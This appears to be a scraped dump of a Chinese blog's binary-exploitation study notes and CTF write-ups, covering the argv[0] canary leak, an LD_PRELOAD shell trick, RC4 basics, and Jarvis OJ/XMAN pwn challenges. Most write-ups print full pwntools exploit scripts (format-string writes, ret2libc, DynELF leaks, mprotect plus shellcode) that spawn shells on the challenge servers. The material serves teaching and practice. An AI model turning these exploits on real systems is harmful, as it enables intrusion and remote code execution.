对于获取远程shell的题目，没有设置suid/sgid 这种情况下，可能使用LD_PRELOAD加载库来获取shell 问题 LD_PRELOAD具体是否可以用于远程获取shell？ 需要解决以下三点 如何设置自己的库 如何利用LD_PRELOAD 如何更改正在运行的进程的环境变量 问题点1:如何设置自己的库只能利用二进制文件中上传文件的过程 目标处理将用户输入的数据保存为文件 通常没有这样的代码，并且存在严格限制 如果服务器上同时运行多个问题服务，则可以通过其他问题获取的shell将文件保存到/tmp等目录 问题点2:如何利用LD_PRELOAD 假设可以在正在运行的进程中伪造LD_PRELOAD环境变量 具体如何操作，之后说明 能够影响LD_~系列环境变量的，基本是在外部命令运行时 也就是说，应该先调查system()或者execve()之类的 首先，确认system()对环境变量的处理 http://osxr.org/glibc/source/nptl/pt-system.c http://osxr.org/glibc/source/sysdeps/posix/system.c http://osxr.org/glibc/source/sysdeps/posix/system.c http://osxr.org/glibc/source/csu/init-first.c 整个流程跟踪下来，可以确定system()具有与调用进程相同的环境变量 也就是说，system()环境变量自动继承 而通过exp rop等方式可以调用system() 二进制文件自身也可能调用system() 问题点3:如何更改正在运行的进程的环境变量 在程序启动前修改环境变量很简单 libc中的putenv()函数可以修改运行中进程的环境变量 但是，通过ROP调用putenv，不如直接调用system 如果存在足够的溢出空间，则可以伪造stack envp[] 如果envp[]中一个元素被修改为”LD_PRELOAD=./mylib.so” 就可以了 通过溢出修改envp 在return前(canary检查前)调用system 运行测试首先生成自定义的库 这个函数具有constructor属性，因此会在库被加载时自动执行 通过溢出使函数返回前调用system() 运行后，打开了另外一个shell 通过伪造环境变量成功执行了mylib.so 总结这种方式的条件非常严格： 远程shell类型(没有suid/sgid) 可以在远程环境设置任意文件 存在足够的溢出空间 栈溢出后，返回之前调用system() 可以向固定地址区域写入任意数据 当然，遇到了的话就直接用以上知识解决吧","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"RC4简单学习","slug":"RC4简单学习","date":"2019-06-12T03:07:40.000Z","updated":"2019-06-12T03:08:16.369Z","comments":true,"path":"2019/06/12/RC4简单学习/","link":"","permalink":"https://darkwing.moe/2019/06/12/RC4%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"简介 很常见的流密码 现实世界被认为是弱加密方式 但事实上，并没发现任何明确的漏洞 Bit-flip-attack这种，原理上没什么用的攻击 针对与RC4结合使用的协议特征的攻击 除此之外，”概率性确定密钥比特位”的攻击 https://en.wikipedia.org/wiki/RC4 需要很多密文进行分析 如果密文量不足，RC4仍然不切实际(短时间内)不可解读 常规CTF问题，量及时间都很困难 因此，RC4题目还能在CTF中存活 RC4算法由两个元素组成 KSA(Key-scheduling algorithm 密钥调度算法) 从key创建表的过程 PRGA(Pseudo-random generation algorithm 伪随机生成算法) 在更新表时生成伪随机数序列的过程 实际使用时，经常结合IV(Initialization Vector 初始化向量)使用 这用于防止相同的明文在使用相同的密钥加密时产生相同的密文(类似linux密码中的salt) 类似的，在解密时，从密钥生成伪随机数序列并对密文进行xor异或 1.KSA(生成表) 最终生成的S是RC4的状态表，因为只对S进行交换处理，最终将重新排列[0,1,2,…255] 2.PRGA(生成伪随机数) 最终的output是生成的随机数序列 由于密钥未在PRGA中使用（密钥已经反映在S中），如果作为RC4内部表的S泄漏，则可以识别出随后的伪随机数序列 关于RC4实现 RC4通常由KSA和PRGA实现为单独的函数 表S由KSA或PRGA使用 也就是说，它通常被定义为全局变量（= .bss） 通过argv[0] leak获取全局变量中的密码","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"Pwn学习笔记19:argv[0] leak","slug":"Pwn学习笔记19-argv-0-leak","date":"2019-06-11T06:53:16.000Z","updated":"2019-06-11T06:54:17.678Z","comments":true,"path":"2019/06/11/Pwn学习笔记19-argv-0-leak/","link":"","permalink":"https://darkwing.moe/2019/06/11/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B019-argv-0-leak/","excerpt":"","text":"argv[0] leak - Stack Canary实现Stack Canary gcc编译后，stack上存在一个canary 进入函数时，canary被随机赋值 退出函数时(return前)，会检查canary是否被修改 简单测试自己写一段简单代码，产生溢出，查看结果 gcc加入了一个叫做SSP(ProPolice)的机制 溢出导致canary被修改，检测到之后产生这样的错误信息 栈的结构及溢出情况大概是这样，当产生溢出时，一定会覆盖到canary stack canary的检查机制 进入函数时，canary值从TLS区域(fs:0x28)到rax，再加载到stack上，之后清空rax 正常执行函数代码 退出函数前检查stack上canary与TLS区域的canary是否相等，检测到被修改则调用__stack_chk_fail() argv[0] leak - __stack_chk_fail()实现__stack_chk_fail()内部实现 http://osxr.org/glibc/source/debug/stack_chk_fail.c http://osxr.org/glibc/source/debug/fortify_fail.c http://osxr.org/glibc/source/sysdeps/posix/libc_fatal.c http://osxr.org/glibc/source/sysdeps/generic/paths.h __libc_argv http://osxr.org/glibc/source/csu/init-first.c __libc_init_first()是__libc_start_main() 掉哟ing的函数，也就是说，ELF启动时一定会调用 在stack上大概是这样 argv[0] leak - 运行测试能否通过溢出修改栈上的argv[0]？ 测试代码 定语一个测试字符串，确定它的地址，然后溢出写入很多这个地址 在检查canary时断点，检查状态，这时候栈上的argv[0]应该已经被修改为定义的字符串 继续运行，因为canary被修改，调用__stack_chk_fail()，错误信息显示的argv[0]也已经是定义的字符串 通过这种方式，就能够泄漏任意内存 但是，程序在此之后会结束，所以即使多次运行也只能泄漏”不变的字符串/数据” 这就是通过argv[0]进行内存泄漏的技术 假设在存在stack canary的函数中产生溢出 stack canary被检测到修改 调用__stack_chk_fail() 产生错误信息，结束 错误信息中包含__libc_argv[0] __libc_argv[0]是存在于stack上的argv[0] 这个argv[0]也可以通过溢出修改 如果有足够的溢出空间，那么就能够同时做到”canary破坏”和”argv[0]重写” 泄漏目标可以是地址固定区域的值，例如.data或者.bss flag自身(如果在内存里) 秘密信息，例如密码，密钥信息 func@GOT 根据低12比特位识别libc版本 https://qiita.com/sei0o/items/55db337b0829367a2052 补充 - xinetd与socat的默认行为差异xinetd环境下 会因为/dev/tty打开失败输出到stderr中 在xinetd中，stderr绑定到socket 因此argv[0]泄漏大体上是能成功的 socat环境下 能成功打开/dev/tty，输出到/dev/tty中 /dev/tty表示终端屏幕，因此无法连接到socket 因此，不能使用argv[0]泄漏 在本地执行的情况下，如果想要socat的行为类似于xinetd，则需要手动添加stderr,setsid选项 如果远程环境是socat，并且没有stderr,setsid，伪造环境变量LIBC_FATAL_STDERR_=1也可以","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记18:Stack细节及argv[0] leak","slug":"Pwn学习笔记18-Stack细节及argv-0-leak","date":"2019-06-05T08:09:13.000Z","updated":"2019-06-05T08:11:41.783Z","comments":true,"path":"2019/06/05/Pwn学习笔记18-Stack细节及argv-0-leak/","link":"","permalink":"https://darkwing.moe/2019/06/05/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B018-Stack%E7%BB%86%E8%8A%82%E5%8F%8Aargv-0-leak/","excerpt":"","text":"stack细节想要知道详细信息，可以写一段什么都不做的代码，例如这样： 1234$ cat test.c void main(void)&#123;&#125;$ gcc test.c -o test 编译，gdb运行，查看内存状态 main的返回地址 __libc_start_main()所使用的stack argv[ ] 实体 envp[ ] 实体 ELF Auxiliary Vectors argv[]或者envp[]之类所使用的字符串本身(一直到结尾) 最终，一个完整的stack状态如图： argv 产生错误时可能泄漏部分信息 这一点exploit时用的较多 ELF Auxiliary Vectors http://articles.manugarg.com/aboutelfauxiliaryvectors 主要是从内核传递各种值的表 极少数情况下，可以用作反调试 可以使用LD_SHOW_AUXV查看其中的值 但是ELF Auxiliary Vectors很少用于exploit vdso_base或者ld_base的leak AT_RANDOM(指向地址)，在没有到达canary路径时可用 argv[0] leak如果满足以下条件，则可能产生通用内存泄漏 存在Stack Canary保护(很常见) 利用了canary被破坏后调用的__stack_chk_fail() 如果stack上有8字节或者更多的数组，则通常会出现 没有开启PIE(Position-Independent Executables)(很常见) 也就是说，默认编译的二进制文件(高版本gcc默认启用PIE了) canary保护的函数有足够的栈溢出空间(CTF中很常见) 允许空字符的溢出问题 本地权限提升类型或者xintd类型(CVTF中很常见) 可以获取到glibc给出的错误信息 如果满足这些条件，则可以泄漏任意( 指定地址)内存 但是需要注意，leak之后进程会结束 也就是说不能用于常规ASLR环境下","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"61dctf fm","slug":"61dctf-fm","date":"2019-05-23T08:30:31.000Z","updated":"2019-05-23T08:31:08.040Z","comments":true,"path":"2019/05/23/61dctf-fm/","link":"","permalink":"https://darkwing.moe/2019/05/23/61dctf-fm/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9895 fm.eaef2247796c11db798a579396482399 32位elf，没开PIE，其他基本都开了： 静态分析有一个明显的格式化字符串漏洞，当x为4时会执行system(“/bin/sh”),x的值初始化3 exploit所以就要利用格式化字符串漏洞的任意地址读写，“x_addr%[i]$n”，%n可以将已经输出的字符个数写入到指定的参数中，这个格式化字符串会在栈上的某处，需要定位x_addr作为printf的第几个参数来确定[i]的值，由于x_addr在32位程序中刚好是4个字节，所以这个格式化字符串刚好能把相应参数变为4。通过gdb确定位置 可以确定是第11个参数： 那么就可以把AAAA替换为x的地址，p换成n就可以把x写成4 构造exp123456789101112131415from pwn import *elf = ELF('./fm')sh = remote('pwn2.jarvisoj.com', 9895)# sh = process('./fm')context.arch = elf.arch# context.log_level = 'debug'x_addr = 0x0804A02Cpayload = p32(x_addr) + \"%11$n\"sh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level5","slug":"XMAN-level5","date":"2019-05-21T01:48:47.000Z","updated":"2019-05-21T01:49:22.480Z","comments":true,"path":"2019/05/21/XMAN-level5/","link":"","permalink":"https://darkwing.moe/2019/05/21/XMAN-level5/","excerpt":"","text":"题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64 那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件 静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”/bin/sh” 给出的libc文件中有这两个 那么思路就和level3类似，leak之后计算地址，执行system 题目要求使用mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 区别同样只在于32位和64位的栈上 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1 在64位程序运行中，参数传递需要寄存器 64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中 参数超过六个时，从第七个开始压入栈中 exploit 想要使用mprotect，且给了libc，那首选是用write函数leak出某个函数（比如write）的地址，然后由libc计算偏移得到mprotect。 把shellcode写到bss段用read可以直接搞定不多说。 由于是64位的程序，函数的前6个参数都是通过寄存器来传递的，而rwx的十进制表示是7（b111），且mprotect的函数定义是int mprotect(void *addr, size_t len, int prot);。我们的7是作为第三个参数放在rdx里，而一般是不存在有关rdx的gadgets的，所以这里我们考虑使用__libc_csu_init尾部的万能gadgets（能解决三个参数内的函数调用）。 大致流程：栈溢出 -&gt; leak write -&gt; hijack got -&gt; read shellcode from stdin to bss -&gt; call mprotect to set ‘rwx’ -&gt; exec shellcode _libc_csu_init函数是程序调用libc库用来对程序进行初始化的函数，一般先于main函数执行 构造exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from pwn import *elf = ELF('./level5')libc = ELF('./libc-2.19.so')sh = remote('pwn2.jarvisoj.com', 9884)# sh = process('./level5')context.arch = 'amd64'# context.log_level = 'debug'write_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]read_plt = elf.plt['read']read_got = elf.got['read']vuln_func = elf.symbols[\"vulnerable_function\"]write_libc = libc.symbols[\"write\"]bss_addr = elf.bss()shellcode = asm(shellcraft.amd64.sh())pop_rdi = 0x00000000004006b3pop_rsi_r15 = 0x00000000004006b1payload1 = 'A' * 0x88payload1 += p64(pop_rsi_r15) + p64(write_got) + p64(0)payload1 += p64(pop_rdi) + p64(1)payload1 += p64(write_plt)# hijack __libc_start_main -&gt; mprotectmprotect_got = elf.got['__libc_start_main']payload1 += p64(pop_rsi_r15) + p64(mprotect_got) + p64(0)payload1 += p64(pop_rdi) + p64(0)payload1 += p64(read_plt)# read shellcode from stdin to bsspayload1 += p64(pop_rsi_r15) + p64(bss_addr) + p64(0)payload1 += p64(read_plt)# hijack __gmon_start__ -&gt; bss_shellcodebss_got = elf.got['__gmon_start__']payload1 += p64(pop_rsi_r15) + p64(bss_got) + p64(0)payload1 += p64(read_plt)payload1 += p64(elf.symbols['main'])sh.recv() # 'Input:\\n'sh.send(payload1)write_addr = u64(sh.recv(8))libc_base = write_addr - write_libclibc_mprotect = libc.symbols['mprotect']mprotect_addr = libc_base + libc_mprotectpause()sh.send(p64(mprotect_addr))pause()sh.send(shellcode)pause()sh.send(p64(bss_addr))\"\"\"0x400690 &lt;__libc_csu_init+64&gt;: mov rdx,r130x400693 &lt;__libc_csu_init+67&gt;: mov rsi,r140x400696 &lt;__libc_csu_init+70&gt;: mov edi,r15d0x400699 &lt;__libc_csu_init+73&gt;: call QWORD PTR [r12+rbx*8]0x4006a6 &lt;__libc_csu_init+86&gt;: add rsp,0x80x4006aa &lt;__libc_csu_init+90&gt;: pop rbx0x4006ab &lt;__libc_csu_init+91&gt;: pop rbp0x4006ac &lt;__libc_csu_init+92&gt;: pop r120x4006ae &lt;__libc_csu_init+94&gt;: pop r130x4006b0 &lt;__libc_csu_init+96&gt;: pop r140x4006b2 &lt;__libc_csu_init+98&gt;: pop r150x4006b4 &lt;__libc_csu_init+100&gt;: ret\"\"\"payload2 = 'A' * 0x88payload2 += p64(0x4006a6)payload2 += p64(0xdeadbeef)payload2 += p64(0) # rbxpayload2 += p64(1) # rbp# r12-&gt;addr &gt;&gt; call mprotect to set 0x600000(rw-p) to rwxp so shellcode can be executepayload2 += p64(elf.got['__libc_start_main'])payload2 += p64(7) # r13 = rdxpayload2 += p64(0x1000) # r14 = rsipayload2 += p64(0x00600000) # edi bss:0000000000600a88payload2 += p64(0x400690)payload2 += p64(0xdeadbeef)payload2 += p64(0) # rbxpayload2 += p64(1) # rbppayload2 += p64(elf.got['__gmon_start__']) # r12-&gt;addr &gt;&gt; call shellcodepayload2 += p64(0) # r13-&gt;rdxpayload2 += p64(0) # r14-&gt;rsipayload2 += p64(0) # r15-&gt;edipayload2 += p64(0x400690)sh.recv() # 'Input:\\n'pause()sh.send(payload2)sh.interactive() 因为是call QWORD PTR [r12+rbx*8]，调用的指针，所以需要劫持GOT，不能直接使用地址 getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level4","slug":"XMAN-level4","date":"2019-05-20T03:43:36.000Z","updated":"2019-05-20T03:44:35.632Z","comments":true,"path":"2019/05/20/XMAN-level4/","link":"","permalink":"https://darkwing.moe/2019/05/20/XMAN-level4/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9880 level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0 32位elf，开了Partial RELRO和NX： 静态分析 明显的溢出，没有直接可用的system，libc也未知 我们可以使用pwntools的DynELF模块来泄漏地址信息，具体参考这篇： 【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客，安全资讯平台https://www.anquanke.com/post/id/85129 同时还有一点，因为文件本身内部没有字符串”/bin/sh”，所以我们要将它写到bss段中一边以后读取，我们在IDA中，可以看到bss段哪里开始是空的 exploit因为read有三个参数，想要read之后执行system的话需要pop3ret的gadget，使用ROPgadget查找： 构造exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *elf = ELF('./level4')sh = remote('pwn2.jarvisoj.com', 9880)# sh = process('./level4')context.arch = 'i386'# context.log_level = 'debug'bss_addr = 0x0804A024read_plt = elf.plt['read']write_plt = elf.plt['write']vuln_func = elf.symbols[\"vulnerable_function\"]pop3ret = 0x08048509def leak(address): # write(STDOUT,address,4) payload = 'A' * (0x88 + 4) payload += p32(write_plt) payload += p32(vuln_func) payload += p32(1) payload += p32(address) payload += p32(4) sh.send(payload) leak_addr = sh.recv(4) return leak_addrd = DynELF(leak, elf=ELF('./level4'))system_addr = d.lookup('system', 'libc')# read(STDIN,bss_addr,8)payload = 'A' * (0x88 + 4)payload += p32(read_plt)payload += p32(pop3ret)payload += p32(0)payload += p32(bss_addr)payload += p32(8)# system('/bin/sh')payload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(bss_addr)sh.send(payload)sh.send('/bin/sh\\x00')sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level3_x64","slug":"XMAN-level3-x64","date":"2019-05-17T06:43:03.000Z","updated":"2019-05-17T06:43:34.488Z","comments":true,"path":"2019/05/17/XMAN-level3-x64/","link":"","permalink":"https://darkwing.moe/2019/05/17/XMAN-level3-x64/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9883 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de 64位elf，只开了NX，并且给出了libc文件 静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”/bin/sh” 给出的libc文件中有这两个 那么思路就和level3类似，leak之后计算地址，执行system 区别同样只在于32位和64位的栈上 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1 在64位程序运行中，参数传递需要寄存器 64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中 参数超过六个时，从第七个开始压入栈中 exploit构造exp write函数三个参数，需要rdi，rsi和rdx system函数只需要rdi即可 ROPgadget查找可用gadget： 存在pop rdi和rsi的gadget，但没有rdx 在write函数中，rdx即第三个参数为长度，第二个参数是一个内存地址，64位系统下长度为8，那么如果rdx在这个时候大于等于8的话就不需要去刻意处理 使用gdb简单调试，发现执行完read后的rdx为0x200，满足条件，那么就不需要去考虑rdx 构造exp代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *elf = ELF('./level3_x64')libc = ELF('./libc-2.19.so')sh = remote('pwn2.jarvisoj.com', 9883)# sh = process('./level3_x64')context.arch = 'amd64'# context.log_level = 'debug'write_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]vuln_func = elf.symbols[\"vulnerable_function\"]write_libc = libc.symbols[\"write\"]sys_libc = libc.symbols[\"system\"]bin_sh_libc = libc.search(\"/bin/sh\").next()pop_rdi = 0x00000000004006b3pop_rsi_r15 = 0x00000000004006b1payload1 = 'A' * 0x88# write(STDOUT,write_got,rdx)# ret = vuln_func# rdi = 1payload1 += p64(pop_rdi) + p64(1)# rsi = write_got# r15 = temppayload1 += p64(pop_rsi_r15) + p64(write_got) + p64(0xdeadbeef)payload1 += p64(write_plt) + p64(vuln_func)sh.recvline()sh.sendline(payload1)write_addr = u64(sh.recv(8))libc_base = write_addr - write_libcsys_addr = libc_base + sys_libcbin_sh_addr = libc_base + bin_sh_libcpayload2 = 'A' * 0x88# system(\"bin/sh\")# ret = vuln_func# rdi = bin_sh_addrpayload2 += p64(pop_rdi) + p64(bin_sh_addr)payload2 += p64(sys_addr) + p64(vuln_func)sh.sendline(payload2)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level3","slug":"XMAN-level3","date":"2019-05-17T05:52:09.000Z","updated":"2019-05-17T05:55:51.708Z","comments":true,"path":"2019/05/17/XMAN-level3/","link":"","permalink":"https://darkwing.moe/2019/05/17/XMAN-level3/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9879 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3.rar.2047525b05c499c9dd189ba212bba1f8 32位elf，开了Partial RELRO和NX，并且给出了libc文件 静态分析IDA F5，首先看elf文件，明显的溢出，但程序中没有直接的system和”/bin/sh” img img 但给出的libc文件中有这两个 但因为有ASLR，libc只能获取到偏移地址，内存中真实地址未知，需要leak 这里可以利用程序本身存在的write函数，泄漏其自身地址，计算出其他所需地址 sys_addr - sys_libc == write_addr - write_libc 那么我们就可以构造溢出，首先通过write泄漏地址，之后返回到vuln函数中再次溢出执行system(“/bin/sh”) 流程大概如下，图源自网络 exploit构造exp12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *elf = ELF('./level3')libc = ELF('./libc-2.19.so')sh = remote('pwn2.jarvisoj.com', 9879)# sh = process('./level3')context.arch = 'i386'# context.log_level = 'debug'write_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]vuln_func = elf.symbols[\"vulnerable_function\"]write_libc = libc.symbols[\"write\"]sys_libc = libc.symbols[\"system\"]bin_sh_libc = libc.search(\"/bin/sh\").next()payload1 = 'A' * 0x88 + 'BBBB'# write(STDOUT,write_got,4)# ret = vuln_funcpayload1 += p32(write_plt)payload1 += p32(vuln_func)payload1 += p32(1)payload1 += p32(write_got)payload1 += p32(4)sh.recvuntil(\"Input:\\n\")sh.sendline(payload1)write_addr = u32(sh.recv(4))libc_base = write_addr - write_libcsys_addr = libc_base + sys_libcbin_sh_addr = libc_base + bin_sh_libcpayload2 = 'A' * 0x88 + 'BBBB'# system(\"bin/sh\")# ret = vuln_funcpayload2 += p32(sys_addr)payload2 += p32(vuln_func)payload2 += p32(bin_sh_addr)sh.sendline(payload2)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level2_x64","slug":"XMAN-level2-x64","date":"2019-05-16T08:42:02.000Z","updated":"2019-05-16T08:47:17.580Z","comments":true,"path":"2019/05/16/XMAN-level2-x64/","link":"","permalink":"https://darkwing.moe/2019/05/16/XMAN-level2-x64/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9882 level2_x64.04d700633c6dc26afc6a1e7e9df8c94e 64位elf，只开了NX img 静态分析IDA F5，明显溢出 img img 其他地方和level2没什么区别，只是64位和32位栈的区别 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1 在64位程序运行中，参数传递需要寄存器 64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中 参数超过六个时，从第七个开始压入栈中 exploit所以我们将”/bin/sh”作为system函数参数的话需要一个pop rdi的gadget，直接使用ROPGadget查找 img 之后构造exp即可 构造exp1234567891011121314151617181920from pwn import *elf = ELF('./level2_x64')sh = remote('pwn2.jarvisoj.com', 9882)# sh = process('./level2_x64')context.arch = 'i386'# context.log_level = 'debug'system_addr = elf.symbols[\"system\"]bin_sh_addr = elf.search(\"/bin/sh\").next()pop_rdi_ret = 0x00000000004006b3payload = 'A' * 0x88payload += p64(pop_rdi_ret)payload += p64(bin_sh_addr)payload += p64(system_addr)sh.sendline(payload)sh.interactive() getflag img","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level2","slug":"XMAN-level2","date":"2019-05-15T07:39:59.000Z","updated":"2019-05-15T07:40:37.978Z","comments":true,"path":"2019/05/15/XMAN-level2/","link":"","permalink":"https://darkwing.moe/2019/05/15/XMAN-level2/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9878 level2.54931449c557d0551c4fc2a10f4778a1 开了NX和Partial RELRO 静态分析IDA F5，可以看到明显的溢出，但可利用区域有限： 存在system函数及’/bin/sh’字符串，那么就可以修改返回地址为调用system(‘/bin/sh’))来getshell 流程大概如图，图源自网络 exploit构造exp12345678910111213141516171819from pwn import *elf = ELF('./level2')sh = remote('pwn2.jarvisoj.com', 9878)# sh = process('./level2')context.arch = 'i386'# context.log_level = 'debug'system_addr = elf.symbols[\"system\"]bin_sh_addr = elf.search(\"/bin/sh\").next()payload = 'A' * (0x88 + 4) # buf + old_ebppayload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(bin_sh_addr)sh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level0","slug":"XMAN-level0","date":"2019-05-15T02:14:51.000Z","updated":"2019-05-15T02:15:25.034Z","comments":true,"path":"2019/05/15/XMAN-level0/","link":"","permalink":"https://darkwing.moe/2019/05/15/XMAN-level0/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d 只开了NX 静态分析IDA F5，明显的溢出 在import中发现system，text中vuln上面发现内置的callsystem 那就很简单了，修改返回地址为callsystm直接getshell exploitoffset = 136 = 0x80 + 8 构造exp12345678910111213141516from pwn import *elf = ELF('./level0')sh = remote('pwn2.jarvisoj.com', 9881)# sh = process('./level0')context.arch = 'amd64'context.log_level = 'debug'callsystem = elf.symbols[\"callsystem\"]payload = 'A' * 0x88payload += p64(callsystem)sh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level1","slug":"XMAN-level1","date":"2019-05-14T08:13:31.000Z","updated":"2019-05-14T08:14:25.421Z","comments":true,"path":"2019/05/14/XMAN-level1/","link":"","permalink":"https://darkwing.moe/2019/05/14/XMAN-level1/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9877 level1.80eacdcd51aca92af7749d96efad7fb5 没开NX 静态分析IDA F5一把梭 img 流程很简单，明显的溢出，并且打印出了buf的地址 那么就可以直接将shellcode写到已知地址的buf中，并且通过溢出将返回地址修改为buf执行shellcode 简单示意图，图源自网络 img exploit img offset = 140 = 0x88 +4,因为有一个old_ebp，之后才是返回地址 构造exp12345678910111213141516171819from pwn import *elf &#x3D; ELF(&#39;.&#x2F;level1&#39;)sh &#x3D; remote(&#39;pwn2.jarvisoj.com&#39;, 9877)# sh &#x3D; process(&#39;.&#x2F;level1&#39;)context.arch &#x3D; &#39;i386&#39;context.log_level &#x3D; &#39;debug&#39;buf_addr &#x3D; sh.recv()[12:22]buf_addr &#x3D; p32(int(buf_addr, 16))shellcode &#x3D; asm(shellcraft.sh())payload &#x3D; shellcode.ljust(0x88, &#39;A&#39;)payload +&#x3D; &#39;BBBB&#39;payload +&#x3D; buf_addrsh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Tell Me Something","slug":"Tell-Me-Something","date":"2019-05-14T01:14:18.000Z","updated":"2019-05-14T01:15:11.519Z","comments":true,"path":"2019/05/14/Tell-Me-Something/","link":"","permalink":"https://darkwing.moe/2019/05/14/Tell-Me-Something/","excerpt":"","text":"题目信息 Do you have something to tell me? nc pwn.jarvisoj.com 9876 guestbook.d3d5869bd6fb04dd35b29c67426c0f05 checksec只开了NX 1234567$ checksec --file guestbook[*] &#39;&#x2F;Users&#x2F;miao&#x2F;&#x2F;CTF&#x2F;PWN&#x2F;guestbook&#x2F;guestbook&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 静态分析直接IDA F5，可以看到一个明显的溢出，并且有一个good_game函数 good_game函数功能为读取flag 那就很明显了，通过溢出修改返回地址为good_game,读取flag exploitgdb确认信息及good_game地址 构造exp： 123456789101112131415from pwn import *elf = ELF('./guestbook')sh = remote('pwn.jarvisoj.com', 9876)# sh = process('./guestbook')context.arch = 'amd64'context.log_level = 'debug'good_game_addr = elf.symbols[\"good_game\"]payload = 'A' * 0x88payload += p64(good_game_addr)sh.sendline(payload)sh.recvline()sh.interactive() 